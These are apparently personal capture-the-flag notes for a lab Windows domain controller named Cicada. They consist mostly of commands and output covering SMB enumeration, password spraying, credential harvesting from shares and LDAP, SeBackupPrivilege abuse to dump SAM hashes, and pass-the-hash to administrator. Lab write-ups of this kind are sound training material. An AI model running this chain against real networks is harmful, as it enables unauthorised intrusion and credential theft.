
![[Pasted image 20241003102604.png]]

```bash
┌──(root💀gobots)-[03Oct2024 14:26:59]-[/home/kali]
└─# nmap -Pn -sV cicada  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 14:27 UTC
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 13.15% done; ETC: 14:29 (0:02:12 remaining)
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 50.95% done; ETC: 14:28 (0:00:38 remaining)
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.75% done; ETC: 14:28 (0:00:23 remaining)
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.90% done; ETC: 14:28 (0:00:12 remaining)
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 88.60% done; ETC: 14:27 (0:00:06 remaining)
Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 97.85% done; ETC: 14:27 (0:00:01 remaining)
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 9.09% done; ETC: 14:27 (0:00:00 remaining)
Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 9.09% done; ETC: 14:29 (0:01:00 remaining)
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.91% done; ETC: 14:28 (0:00:03 remaining)
Stats: 0:01:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.91% done; ETC: 14:28 (0:00:05 remaining)
Nmap scan report for cicada (10.10.11.35)
Host is up (0.094s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-03 21:28:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.59 seconds  


got potential password from smb share
```



```bash
┌──(root💀gobots)-[03Oct2024 14:29:27]-[/home/kali]
└─# smbclient -L \\\\cicada -N               

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to cicada failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

```bash
┌──(root💀gobots)-[03Oct2024 14:32:08]-[/home/kali]                                                                                                                            
└─# smbclient \\\\cicada\\HR -N                                                                                                                                                                            
Try "help" to get a list of possible commands.                                                                                                                                                             
smb: \> ls                                                                                                                                                                                                 
  .                                   D        0  Thu Mar 14 12:29:09 2024                                                                            
  ..                                  D        0  Thu Mar 14 12:21:29 2024                                                                                
  Notice from HR.txt                  A     1266  Wed Aug 28 17:31:48 2024 
```

```bash
┌──(root💀gobots)-[03Oct2024 14:32:56]-[/home/kali]
└─# cat 'Notice from HR.txt' 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```
Cicada DC
```bash
┌──(root💀gobots)-[03Oct2024 14:39:27]-[/home/kali]
└─# smbclient \\\\cicada\\NETLOGON -N
do_connect: Connection to CICADA-DC failed (Error NT_STATUS_NOT_FOUND)
```

```
┌──(root💀gobots)-[03Oct2024 14:59:29]-[/opt/kerbrute]
└─# crackmapexec ldap cicada  -u '' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         cicada          445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        cicada          445    CICADA-DC        [-] cicada.htb\:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target ?
```


```bash
                                                                                                                                                                                                           
┌──(root💀gobots)-[03Oct2024 15:00:30]-[/opt/kerbrute]                                                                                                                                                     
└─# ./kerbrute_linux_amd64 userenum -d cicada.htb --dc CICADA-DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt                                                                           
                                                                                                                                                                                                           
    __             __               __                                                                                                                                                                     
   / /_____  _____/ /_  _______  __/ /____                                                                                                                                                                 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \                                                                                                                                                                
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/                                                                                                                                                                
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                                                                                                                                                 
                                                                                                                                                                                                           
Version: dev (n/a) - 10/03/24 - Ronnie Flathers @ropnop                                                                                                                                                    
                                                                                                                                                                                                           
2024/10/03 15:01:26 >  Using KDC(s):                                                                                                                                                                       
2024/10/03 15:01:26 >   CICADA-DC:88                                                                                                                                                                       
                                                                                                                                                                                                           
2024/10/03 15:01:26 >  [!] michael@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such
 host) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] mike@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such ho
st) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] david@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such h
ost) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] info@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such ho
st) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] NULL@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such ho
st) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] chris@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such h
ost) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] john@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such ho
st) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] robert@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such 
host) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] admin@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such h
ost) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] 2000@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such ho
st) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] daniel@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such 
host) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] 123456@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such 
host) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/10/03 15:01:26 >  [!] steve@cicada.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error resolving KDC address: lookup CICADA-DC on 18.252.172.229:53: no such h
ost) and then TCP (error in getting a TCP connection to any of the KDCs)

```


https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/
```bash
┌──(root💀gobots)-[03Oct2024 15:16:43]-[/opt/kerbrute]
└─# impacket-lookupsid cicada.htb/anonymous@10.10.11.35 20000 -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.10.11.35
[*] StringBinding ncacn_np:10.10.11.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)

```

users.txt
```bash
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

spray
`michael.wrightson works`
```bash
┌──(root💀gobots)-[03Oct2024 15:21:59]-[/home/kali/SUT/htb/cicada]
└─# netexec smb cicada -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --rid-brute 20000
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```



```bash
┌──(root💀gobots)-[03Oct2024 15:28:58]-[/home/kali/SUT/htb/cicada]
└─# crackmapexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares 
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [+] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 

```

```bash
smbclient -U 'cicada.htb/michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/HR
```

```bash
┌──(root💀gobots)-[03Oct2024 15:32:08]-[/home/kali/SUT/htb/cicada]
└─# smbclient -U 'cicada.htb/michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/SYSVOl
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 22 17:40:07 2024
  ..                                  D        0  Thu Mar 14 11:08:56 2024
  cicada.htb                         Dr        0  Thu Mar 14 11:08:56 2024

                4168447 blocks of size 4096. 315211 blocks available
smb: \> cd cicada.htb
smb: \cicada.htb\> ls
  .                                   D        0  Thu Mar 14 11:15:21 2024
  ..                                  D        0  Thu Mar 14 11:08:56 2024
  DfsrPrivate                      DHSr        0  Thu Mar 14 11:15:21 2024
  Policies                            D        0  Thu Mar 14 14:58:41 2024
  scripts                             D        0  Thu Mar 14 11:08:56 2024

```

try wmi - bloodhound.py



bloodhound-python pull with credentials that were found with `michael.wrightson` credentials
```bash
┌──(root💀gobots)-[03Oct2024 16:11:35]-[/home/kali]
└─# bloodhound-python -c All -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb -ns 10.10.11.35
INFO: Found AD domain: cicada.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (cicada-dc.cicada.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: cicada-dc.cicada.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: cicada-dc.cicada.htb
INFO: Found 9 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CICADA-DC.cicada.htb
INFO: Done in 00M 06S

```
In the `bloodhound` search for the user `michael.wrightson` navigate to `analysis` and look for 
- can also find the same data with `ldapdomaindump`
![[Pasted image 20241003141431.png]]
Just in case I forget my password is `aRt$Lp#7t*VQ!3` for user `david.orelious`
![[Pasted image 20241003123005.png]]
`ldapdomaindump` example
```bash
┌──(root💀gobots)-[03Oct2024 18:20:07]-[/home/kali]
└─# ldapdomaindump -u cicada.htb\\michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' ldap://10.10.11.35
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                               
```
hosted `python3` server to browse to file and can find the same password in the description
![[Pasted image 20241003142524.png]]

```bash
┌──(root💀gobots)-[03Oct2024 18:29:22]-[/home/kali]
└─# netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
```

```bash
┌──(root💀gobots)-[03Oct2024 18:30:03]-[/home/kali]
└─# netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 

```

```bash
┌──(root💀gobots)-[03Oct2024 18:31:05]-[/home/kali]
└─# smbclient -U 'cicada.htb/david.orelious%aRt$Lp#7t*VQ!3' //10.10.11.35/DEV
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 12:31:39 2024
  ..                                  D        0  Thu Mar 14 12:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 17:28:22 2024

                4168447 blocks of size 4096. 323922 blocks available
smb: \> download Backup_script.ps1
download: command not found
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \> 

```
got emily oscars credentials from backup script
![[Pasted image 20241005015935.png]]
```bash
┌──(root💀gobots)-[03Oct2024 18:37:01]-[/home/kali]
└─# netexec wmi 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
RPC         10.10.11.35     135    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
RPC         10.10.11.35     135    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 

```


```bash
impacket-wmiexec emily.oscars:'Q!3@Lp#M6b*7t*Vt'@cicada
```


```bash
smbclient -U 'cicada.htb/emily.oscars%Q!3@Lp#M6b*7t*Vt' //10.10.11.35/
```


```bash
┌──(root💀gobots)-[05Oct2024 06:14:10]-[/home/kali/SUT/htb]
└─# nmap -Pn -sV cicada -p 3389,5985                                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 06:14 UTC
Nmap scan report for cicada (10.10.11.35)
Host is up (0.036s latency).

PORT     STATE    SERVICE       VERSION
3389/tcp filtered ms-wbt-server
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


```bash
┌──(root💀gobots)-[05Oct2024 06:14:50]-[/home/kali/SUT/htb]
└─# evil-winrm  -i cicada -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'    
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> dir

```
user flag
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> dir                                                                                                                                                  
                                                                                                                                                                                                           
                                                                                                                                                                                                           
    Directory: C:\Users\emily.oscars.CICADA\Desktop                                                                                                                                                        
                                                                                                                                                                                                           
                                                                                                                                                                                                           
Mode                 LastWriteTime         Length Name                                                                                                                                                     
----                 -------------         ------ ----                                                                                                                                                     
-ar---         10/5/2024   6:06 AM             34 user.txt                                                                                                                                                 
                                                                                                                                                                                                           
                                                                                                                                                                                                           
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt                                                                                                                                        
1f401390dafd9fd81cad121589f91d7d      
```


```bash
netexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares
```

```bash
┌──(root💀gobots)-[05Oct2024 06:19:43]-[/home/kali/SUT/htb]
└─# netexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$          READ            Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$              READ,WRITE      Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 

```


```bash
smbclient -U 'cicada.htb/emily.oscars%Q!3@Lp#M6b*7t*Vt' //10.10.11.35/C$
```


```bash
bloodhound-python -c All -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -d cicada.htb -ns 10.10.11.35
```


nope
```bash
./teamserver 10.10.5.50 passphrase /home/attacker/cobaltstrike/c2-profiles/custom.cotf/custom.profile
```





evil winrm whoami /priv
```bash
Info: Establishing connection to remote endpoint                                                                                                                                                           
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all                                                                                                                                        
                                                                                                                                                                                                           
USER INFORMATION                                                                                                                                                                                           
----------------                                  

User Name           SID                           
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION                                 
-----------------                                 

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION                            
----------------------                            

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```
Found SEBACKUPPRIVILEGE


followed this article to backup the sam and system registry
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

saving the sam and system files
```bash
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
downloaded files
![[Pasted image 20241005033448.png]]
pypykatz to open the files hashes
```bash
┌──(root💀gobots)-[05Oct2024 07:27:09]-[/home/kali/SUT/htb]                                                                                                                                                
└─# pypykatz registry --sam sam system                                                                                                                                                                     
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work                                                                                                                           
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work                                                                                                                           
============== SYSTEM hive secrets ==============                                                                                                                                                          
CurrentControlSet: ControlSet001                                                                                                                                                                           
Boot Key: 3c2b033757a49110a9ee680b46e8d620                                                                                                                                                                 
============== SAM hive secrets ==============                                                                                                                                                             
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010                                                                                                                                
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::                                                                                                                     
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                             
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                    
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::      
```
psexec as admin hashes
```bash
┌──(root💀gobots)-[05Oct2024 07:27:14]-[/home/kali/SUT/htb]                                                                                                                                                
└─# impacket-psexec administrator@10.10.11.35 -hashes :2b87e7c93a3e8a0ea4a581937016f341                                                                                                                    
Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                                                                                                                              
